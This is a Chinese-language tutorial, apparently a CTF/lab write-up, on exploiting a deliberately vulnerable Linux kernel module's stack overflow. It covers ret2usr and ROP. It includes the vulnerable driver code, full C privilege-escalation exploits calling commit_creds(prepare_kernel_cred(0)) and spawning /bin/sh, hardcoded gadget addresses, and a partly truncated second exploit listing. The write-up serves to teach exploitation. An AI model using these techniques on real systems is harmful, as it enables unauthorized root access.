## 0x1 内核栈溢出

内核栈溢出的原理其实与应用层的栈溢出效果相同，利用思路也比较相似，这里先编写一个示例检测一下内核中栈溢出是否可以劫持程序流。

在之前基础内核模块之上加入一个存在栈溢出的函数。

```
1.  `static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)`
    
2.  `{`
    
3.  `    char data[64];`
    
4.  `    printk(KERN_INFO "[SO_test:] The chardev_write() function has been called.");  `
    
5.  `    if (_copy_from_user(&data, buf, count) != 0) {`
    
6.  `        return -EFAULT;`
    
7.  `    }`
    
8.  `    return count;`
    
9.  `} `
    
10.  
     
11.  `static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)`
     
12.  `{`
     
13.  
     
14.  `    printk(KERN_INFO "[SO_test:] The chardev_read() function has been called.\n");`
     
15.  `    return 0;`
     
16.  `}`
     
```

这里 `chardev_write`函数可以有用户定义拷贝到内核数据区的内容长度，存在明显溢出，我们尝试利用该溢出劫持程序执行 `chardev_read`函数。这里IDA分析栈空间可以看到data的其实地址距离rbp为0x58.

动态调试发现实际距离为0x50  

![](../Images/18a9d64efe5daec18ae6d560e2ef4050.png)

这里以调试为准，由于没有开启ASLR，地址都可以确定，尝试劫持程序流。  

```

## 0x2 ret2usr  

内核栈溢出中常用的基础利用手法就是 `ret2usr`和 `ROP`，二者代码细节不同但是实现的效果和利用思路相同。这里首先介绍 `ret2usr`。

首先我们需要明白内核pwn的题目思路。就大多数的内核pwn而言，其实核心和渗透中的提权一致，即在拥有降权shell的前提下，如何将权限提升到root，那么在渗透中提权的思路之一就是使用针对内核漏洞的提权exp。内核pwn其实就是这一过程的简化版，出题人会给出一个漏洞模块，同时给我们一个降权shell，我们需要编写exp并执行，实现提权操作，在这个过程中大致流程如下：

![](../Images/7061024758a50d7c6a2c6a93c9ee0220.png)

那么我们需要明白几个概念。  

1.  `Iret`：用于中断服务子程序返回，因为设计内核态和用户态切换，因此需要使用Iret
    
2.  `swapgs`：在 64 位系统中执行 iretq 指令前需要执行一下 swapgs 指令，起作用为将 gs 寄存器的值与 MSR 地址中的值交换。在进入内核态时一般会执行 swapgs 指令获得指向内核数据结构的指针，因此从内核态退出，返回到用户态时也需执行一下 swapgs。
    
3.  `trap_frame`：执行Iret指令时会把栈上的一个trap_frame结构分别pop给相应寄存器其机构如下
    

```
1.  `struct trap_frame {`
    
2.  `    void *eip;       // instruction pointer +0`
    
3.  `    uint32_t cs;     // code segment +4`
    
4.  `    uint32_t eflags; // CPU flags +8`
    
5.  `    void *esp;       // stack pointer +12`
    
6.  `    uint32_t ss;     // stack segment +16`
    
7.  `} __attribute__((packed));`
    
```

了解上述内容的基础上，我们开始进行实操，这里我们使用前文栈溢出的示例，去掉没用的chardev\_read函数。于是有如下exp

```
1.  `//gcc -static -o leak leak.c`
    
2.  `#include <stdio.h>`
    
3.  `#include <stdlib.h>`
    
4.  `#include <fcntl.h>`
    
5.  `#include <unistd.h>`
    
6.  `#include <errno.h>`
    
7.  `#include <string.h>`
    
8.  
    
9.  
    
10.  `#define TEXT_LEN 64`
     
11.  `#define KERNCALL __attribute__((regparm(3)))`
     
12.  `void *(*prepare_kernel_cred)(void *) KERNCALL=0xffffffff8109aeb0;`
     
13.  `void *(*commit_creds)(void *) KERNCALL=0xffffffff8109ab00;`
     
14.  `void get_shell()                                // 开启shell函数`
     
15.  `{`
     
16.  `    system("/bin/sh");`
     
17.  `}`
     
18.  
     
19.  `struct trap_frame {                                // 定义trap_frame结构`
     
20.  `    void *rip;`
     
21.  `    unsigned long cs;`
     
22.  `    unsigned long eflags;`
     
23.  `    void *rsp;`
     
24.  `    unsigned long ss;`
     
25.  `}__attribute__((packed));`
     
26.  
     
27.  `struct trap_frame tf;`
     
28.  `void init_tf(void)                                //  AT&T汇编，初始化tf结构，即先要初始化实现保存，再Iretq实现还原`
     
29.  `{`
     
30.  `    asm volatile("movq %%cs,%0;" // tf+8  set cs`
     
31.  `        "pushfq;" //tf+16  set eflags`
     
32.  `        "popq %1;" //tf+16  set eflags`
     
33.  `        "movq %%rsp,%2;"//tf+24  set rsp`
     
34.  `        "movq %%ss,%3;" //tf+32  set ss`
     
35.  `                :"=r"(tf.cs),"=r"(tf.eflags),`
     
36.  `            "=r"(tf.rsp),"=r"(tf.ss));`
     
37.  `    tf.rip = &get_shell;`
     
38.  `}`
     
39.  
     
40.  `void get_root()                                    // 提权函数`
     
41.  `{`
     
42.  `    commit_creds(prepare_kernel_cred(0));`
     
43.  `    asm("swapgs");`
     
44.  `    asm("movq %0,%%rsp"::"r"(&tf));`
     
45.  `    asm("iretq");`
     
46.  `}`
     
47.  
     
48.  `int main()`
     
49.  `{`
     
50.  `    int fd;`
     
51.  `    size_t rop[512] = {0};`
     
52.  
     
53.  `    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){`
     
54.  `        printf("Cannot open /dev/chardev0. Try again later.\n");`
     
55.  `    }`
     
56.  `    init_tf();`
     
57.  `    int k = 11;`
     
58.  `    memset(&rop[0], 0x41, 80);`
     
59.  `    rop[k++] = (size_t)get_root;`
     
60.  `    write(fd, rop, 8*k++);`
     
61.  
     
62.  `    if (close(fd) != 0){`
     
63.  `        printf("Cannot close.\n");`
     
64.  `    }`
     
65.  `    return 0;`
     
66.  `}`
     
```

接下来我们调试看一下具体运行细节。

首先在 `chardev_write`下断点，这里单步运行到数据传递到内核区

![](../Images/a1779345c7094a53189f5d5147869ed9.png)

之后运行到ret，劫持程序流转去执行我们的提权函数  

![](../Images/f5cff31ce5b17a3a622065e9706c28e5.png)

执行完commit*creds(prepare*kernel\_cred(0))之后首先执行swapgs，之后需要调整栈顶指针再来执行iretq，这是因为在在执行iretq时，栈顶布局需要是如下情况：

![](../Images/46f606145bae69099f45efdedfbfb598.png)

因此我们将trap\_frame结构地址写入rsp，之后执行Iretq,此时我们恢复寄存器值之后布置RIP为getshell的地址，则执行iretq返回之后会跳转去执行getshell  

![](../Images/0a64e13f67561971a8f1be99bd744fd9.png)

即0x4009ae会作为rip进行执行  

![](../Images/bb44adca2c29ebd3aaab0c4fe5fdf535.png)

继续执行到call即可获得shell

## 0x3 ROP  

了解完 `ret2usr`之后这里继续介绍第二种利用手段 `ROP`。提权思路和 `ret2usr`相同，而布局思路和应用层的ROP相同，我们还是在之前模块代码的基础上进行利用。

首先是寻找需要的gadget，这里我们寻找的目标是 `vmlinux`，大小远超一般的应用层漏洞程序。之前看到过有的大师傅提到使用 `ROPgadget`分析缓慢，推荐使用 `ropper`或者 `objdump`等，经过实测还是推荐ROPgdaget，这里推荐直接将所有gadget输出到文件：

```
1.  `ROPgadget --binary ./vmlinux > gadget.txt`
    
```

如果针对某一gadget输出到终端确实很慢，但是如果将所有gadget输出到文件就会快很多，之后可以在txt中进行具体搜索。

理想状态下我们的payload模型应该为：

```
1.  `payload = |padding| + |pop_rdi| + |0| + |prepare_kernel_cred| + |mov_rdi_rax_ret| + |commit_creds| + |swapgs_ret| + |iretq| + |getshell| + |user_cs| + |user_rflags| + |user_rsp| + |user_ss|`
    
```

但是在我当前内核环境中没有找到 `mov rdi,rax;ret`，这条指令，也没找到 `swapgs;ret`,因此对payload模型进行修改

```
1.  `payload = |padding| + |pop_rdi| + |0| + |prepare_kernel_cred| + |pop_rdx_ret| + |pop_rcx_ret| +  |mov_rdi_rax_call_rdx| + |commit_creds| + |0| + |swapgs_pop_ret| +|0| + |iretq| + |getshell| + |user_cs| + |user_rflags| + |user_rsp| + |user_ss|`
    
```

最终exp为：

```
1.  `//gcc -masm=intel -static -o poc poc.c`
    
2.  `#include <stdio.h>`
    
3.  `#include <stdlib.h>`
    
4.  `#include <fcntl.h>`
    
5.  `#include <unistd.h>`
    
6.  `#include <errno.h>`
    
7.  `#include <string.h>`
    
8.  
    
9.  
    
10.  `#define TEXT_LEN 64`
     
11.  `#define KERNCALL __attribute__((regparm(3)))`
     
12.  `size_t prepare_kernel_cred=0xffffffff8109aeb0;`
     
13.  `size_t commit_creds=0xffffffff8109ab00;`
     
14.  `void get_shell()`
     
15.  `{`
     
16.  `    system("/bin/sh");`
     
17.  `}`
     
18.  
     
19.  `size_t user_cs, user_ss, user_rflags, user_sp;`
     
20.  `void save_status()                                                `
     
21.  `{`
     
22.  `    __asm__("mov user_cs, cs;"`
     
23.  `            "mov user_ss, ss;"`

37.  `    save_status();`
     
38.  
     
39.  `    size_t rop[0x1000] = {0};`
     
40.  `    rop[11] = 0xffffffff811db05e; //pop rdi ; ret`
     
41.  `    rop[12] = 0;`
     
42.  `    rop[13] = prepare_kernel_cred;`

46.  `    rop[17] = commit_creds;`
     
47.  `    rop[18] = 0xffffffff8105f224; //swapgs ; pop rbp ; ret`
     
48.  `    rop[19] = 0;`
     
49.  `    rop[20] = 0xffffffff817fbb57; //iretq`
     
50.  `    rop[21] = (size_t)get_shell;  // rip`

52.  `    rop[23] = user_rflags;      // rflags`
     
53.  `    rop[24] = user_sp;          // rsp`
     
54.  `    rop[25] = user_ss;          // ss`
     
55.  
     
56.  `    write(fd, rop, 8*26);`
     
57.  
     
58.  `    if (close(fd) != 0){`

我们还是调试看一下具体运行细节。

首先在 `chardev_write`下断点，这里单步运行到数据传递到内核区

![](../Images/bf813d9584328a55815b2119996c4714.png)

rop成功写入，返回地址指向pop rdi ; ret。首先是布置 `prepare_kernel_cred(0)`  

![](../Images/212ebb3ea6a7644124c9a262ff130201.png)

返回值在rax，之后执行pop rdx ; ret  

![](../Images/0a9fb5eb42aa874455c06f7f8bb05d49.png)

pop rcx ; ret地址放入rdx，之后ret返回到mov rdi, rax ; call rdx  

![](../Images/d909371db80a14900fca877737b7d9ce.png)

跟进call，里面执行pop rcx ; ret，因为call指令会将返回地址压栈，所以这里认为返回地址是0xffffffff810d71cc之后的地址，即0xffffffff810d71ce，此时恰好pop rcx，之后ret返回执行commit\_creds，同理这里不仅可以使用pop rcx ; ret，也可以使用别的，只要能实现相同作用即可，例如可以继续布置pop rdx ; ret.  

![](../Images/d82051ef521e2dc9ff136ff3ea61b398.png)

提权完成之后进行内核到用户的切换，此时因为swapgs后还有个pop rbp，所以填充数据抵消，返回到iretq  

![](../Images/e5f87dbf10b8f5f0a0ad23316efb01f7.png)

执行iretq时，栈顶数据依旧按照trap\_frame排列，rsp指向内容复制rip，即指向getshell函数即可  

![](../Images/16bfdc12db8df92ac89c6df66a99adfb.png)

返回后  

![](../Images/7f46b5a9833259bf5086c2e8346bf0e4.png)

同理，继续执行到call即可获得shell
